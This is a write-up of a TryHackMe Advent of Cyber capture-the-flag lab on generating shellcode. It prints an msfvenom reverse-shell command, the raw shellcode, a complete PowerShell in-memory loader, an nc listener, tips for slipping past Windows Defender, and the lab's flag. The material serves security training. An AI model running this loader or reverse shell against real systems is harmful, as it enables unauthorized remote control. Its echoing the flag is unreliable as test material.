# DAY 8

![Task banner for day 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg)

_Glitch the hacker, clever yet distrusted,_

_Wrote a script with skills finely adjusted._

_Shellcode magic to his home it would send,_

_Where secrets of Wareville he'd carefully penned._

Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware's henchmen lurking nearby.

_"They're wasting their time. I don't have anything they'd want,"_ Glitch chuckled.

He didn't realize that hidden in his home system was something they desperately sought—a research paper he wrote on Wareville's defenses, a treasure Mayor Malware was eager to obtain.

This is the continuation of \[\[CYBERSECURITY/TRYHACKME/ADVENT OF CYBER 2024/DAY 7.md|day 7]]

### Learning Objectives

***

```ad-summary
- Grasp the fundamentals of writing shellcode
- Generate shellcode for reverse shells
- Executing shellcode with PowerShell
```

### Essential Terminologies

***

_A reverse shell to his system so tight,_

_He planned to showcase at the tech conference night._

_Eager to share how his shellcode could impress,_

_He aimed to enlighten, to teach and progress._

Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.

```ad-info
- **Shellcode**: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
- **PowerShell**: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.
- **Windows Defender**: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognize known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defenses. We will cover the latter one in this task.  
- **Windows API**: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include `VirtualAlloc`, `CreateThread`, `WaitForSingleObject`, which we will also use in this task for exploitation.
- **Accessing Windows API through PowerShell Reflection**: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.
- **Reverse shell**: A type of connection in which the target (the machine you're trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox).

### Generating Shellcode

***

_But Mayor Malware's minions, sneaky and sly,_

_Found his script and gave it a try._

_They tampered the code, changed port and IP,_

_Twisted his work with a sinister glee._

Let's learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called `msfvenom` to get a reverse shell.

In the AttackBox, open the terminal and enter the command `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell` that will generate the shellcode. The output will look like the following.  You will require to replace the `ATTACKBOX_IP` with the IP of the AttackBox.

```shell
root@attackbox:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of powershell file: 2259 bytes
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,
0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,
0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,
0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,
0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,
0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,
0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,
0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d,0x85,0xb2,0x0,0x0,
0x0,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,
0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0    
```

The above command generates a piece of shellcode using `msfvenom`. Here's what each part means:

* `-p windows/x64/shell_reverse_tcp`: The `-p` flag tells `msfvenom` what type of payload to create. `windows/x64/shell_reverse_tcp` specifies that we want a reverse shell for a Windows machine.
* `LHOST=ATTACKBOX_IP`: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.
* `LPORT=1111`: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (`1111` in this example). You can choose any available port, but it needs to match with what your listener is set to.
* `-f powershell`: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine.

**Where Is the Actual Shellcode**

The actual shellcode in the output above is the hex-encoded byte array, which starts with `0xfc, 0xe8, 0x82`, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like `0xfc` instead.

We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:

```c#
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

_Phew!_ That's a lot of code. But don't stress. We'll break down what it does step by step.

**Explanation of the Code**

The script starts by defining a few C# classes. These classes use the `DllImport` attribute to load specific functions from the `kernel32` DLL, which is part of the Windows API.

```ad-summary
- `VirtualAlloc`: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.
- `CreateThread`: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.
- `WaitForSingleObject`: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.
```

These classes are then added to PowerShell using the `Add-Type` command, allowing PowerShell to use these functions.

**Storing the Shellcode in a Byte Array**

Next, the script stores the shellcode in the `$buf` variable, a byte array. In the example above, `SHELLCODE_PLACEHOLDER` is just there to show where you would insert the actual shellcode earlier generated through `msfvenom`. Usually, you'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.

**Allocating Memory for the Shellcode**

The `VirtualAlloc` function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:

```ad-info
- `0` for the memory address, meaning that Windows will decide where to allocate the memory.
- `$size` for the size of the memory block, which is determined by the length of the shellcode.
- `0x3000` for the allocation type, which tells Windows to reserve and commit the memory.
- `0x40` for memory protection, the memory is readable and executable (necessary for executing shellcode).
```

After memory is allocated, the `Marshal.Copy` function copies the shellcode from the `$buf` array into the allocated memory address (`$addr`), preparing it for execution.

**Executing the Shellcode and Waiting for Completion**

Once the shellcode is stored in memory, the script calls the `CreateThread` function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). The script then uses the `WaitForSingleObject` function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.

### Time for Some Action - Executing the Shellcode

***

On the AttackBox, execute the command `nc -nvlp 1111` to start a listener on port `1111` and wait for an incoming connection. This command opens port `1111` and listens for connections, allowing the AttackBox to receive data once a connection is made.

```shell
root@attackbox:~# nc -nvlp 1111 
Listening on [0.0.0.0] (family 0, port 1111) 
```

On the AttackBox, begin by navigating to the Desktop. Right-click on the `Desktop`, select `Create Document`, and then choose `Empty File`. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled `SHELLCODE_PLACEHOLDER` and replace it with the shell code we previously created with `msfvenom`.

Once you've added the shellcode navigate to the attached VM, open PowerShell by clicking the PowerShell icon on the taskbar and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:

```shell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   
```

Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and press `Enter`.

```shel
[Byte[]] $buf = SHELLCODE_PLACEHOLDER
```

Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and press `Enter`.

```powershell
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

If you've done it properly, the PowerShell terminal in the VM will look like the screenshot below:

![](Pasted%20image%2020241208144640.png)

Once you execute the final line in the PowerShell terminal and press `Enter`, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing `dir`, which will list all the directories.

### Regaining Access

***

_Now Glitch must act, no time to delay,_

_To fix the shellcode and keep foes at bay._

_He tweaks and he codes to set the wrongs right,_

_Protecting his secrets with all of his might._

Let's dive into the story and troubleshoot the issue in this part of the task. Glitch has realized he's no longer receiving incoming connections from his home base. Mayor Malware's minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is `ATTACKBOX_IP`, and the successful connection port should be `4444`.

Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?

## Question

![](Pasted%20image%2020241208144730.png)

First, let's create the shellcode in order to start the steps to get a reverse shell:

![](Pasted%20image%2020241208145857.png)

Now, let's paste this code into windows to receive the connection once we've set up the listener:

```c#

    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"

$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)

```

We have to copy it step by step in order to avoid the AV, let's paste it and get the connection:

![](Pasted%20image%2020241208151804.png)

![](Pasted%20image%2020241208151833.png)

And like that, we got a reverse shell, flag in this case is: `AOC{GOT_MY_ACCESS_B@CK007}`

Just like that, day 8 is done!
